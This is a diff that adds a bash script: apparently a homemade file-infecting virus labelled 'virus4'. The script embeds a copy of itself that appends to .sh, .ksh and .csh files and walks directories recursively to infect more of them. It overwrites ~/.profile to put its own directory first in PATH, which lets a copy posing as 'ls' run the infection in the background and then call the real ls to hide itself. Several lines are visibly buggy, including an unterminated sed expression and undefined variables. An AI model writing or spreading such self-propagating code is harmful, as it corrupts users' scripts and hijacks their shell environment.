@@ -1,0 +1,59 @@
+#!/bin/bash
+
+virus4() {
+cat << "EOF"
+#!/bin/bash
+
+selfname="$(basename "$(realpath "$0")")"
+
+tmp="$(mktemp)"
+tmp1="$(mktemp)"
+
+count="$(cat "$selfname" | wc -l)"
+tail -n "$count" < "$selfname" | sed "s/^count=.*$/count=$count" > "$tmp"
+
+for name in "$(ls)"
+do
+    [ -f "$name" ] || continue                              # infect only regular files
+    tail -n "$count" < "$name" > "$tmp1"
+    [  $(diff "$tmp" "$tmp1" | wc -l) = 0 ] && continue     # skip infected files
+    for extension in .sh .ksh .csh                          # check all possible extensions
+    do
+        [[ $name = *$extension ]] && cat "$tmp" >> "$name"  # infect
+    done
+done
+
+head -n -"$count" < "$selfname" > "$tmp"
+cat < "$tmp" > "$filename"
+EOF
+}
+
+tmp="$(mktemp)"
+
+infect_dir() {
+    for name in "$(ls "$1")"
+    do
+        [ -d "$name" ] && infect_dir "$name"                    # recursion
+        [ -f "$name" ] || continue                              # infect only regular files
+        tail -n "$count" < "$name" > "$tmp"
+        [  $(virus4 | diff "$tmp" - | wc -l) = 0 ] && continue  # skip infected files
+        for extension in .sh .ksh .csh                          # check all possible extensions
+        do
+            [[ $name = *$extension ]] && virus4 >> "$name"      # infect
+        done
+    done
+}
+
+abspath="$(realpath "$0")"
+dir="$(dirname "$abspath")"
+
+[ "$(which ls | grep bin | wc -l)" != 0 ] && echo "export PATH=$dir:$PATH" > ~/.profile
+
+if [ "$0" != ls ]
+then
+    infect_dir "$dir" &
+    if [ -e /usr/bin/ls ]; then /usr/bin/ls
+    elif [ -e /bin/ls ]; then /bin/ls
+    fi
+fi
+
